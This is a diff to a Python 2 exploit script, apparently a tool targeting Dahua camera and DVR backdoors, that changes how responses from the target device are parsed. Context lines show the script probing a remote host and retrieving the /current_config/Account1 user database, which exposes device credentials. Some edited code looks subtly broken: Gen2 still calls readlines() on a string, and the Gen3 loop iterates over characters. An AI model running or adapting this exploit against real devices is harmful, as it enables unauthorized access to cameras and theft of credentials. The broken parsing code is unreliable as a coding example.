@@ -220,7 +220,7 @@ class Dahua_Backdoor:
 	# Generation 2
 	#
 	def Gen2(self,response,headers):
-		self.response = response
+		self.response = response.read()
 		self.headers = headers
 
 		html = self.response.readlines()
@@ -302,10 +302,21 @@ class Dahua_Backdoor:
 	# Generation 3
 	#
 	def Gen3(self,response,headers):
-		self.response = response
+		self.response = response.read()
 		self.headers = headers
+		#print self.response
+		#json_obj = commentjson.loads(self.response)
 
-		json_obj = commentjson.load(self.response)
+		json_string = ""
+		start=False
+		for x in self.response:
+			if(x[0]=='{' or start==True):
+				start = True
+				json_string = json_string + x
+		json_obj = json.loads(json_string)
+
+
+
 		if self.verbose:
 			print json.dumps(json_obj,sort_keys=True,indent=4, separators=(',', ': '))
 
@@ -535,6 +546,7 @@ if __name__ == '__main__':
 		response = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,headers,None,None)
 		print "[!] Generation 2 found"
 		reponse = Dahua_Backdoor(rhost,proto,verbose,creds,raw_request).Gen2(response,headers)
+		print response
 	except urllib2.HTTPError as e:
 		#
 		# If not, try to find /current_config/Account1 user database (Generation 3)
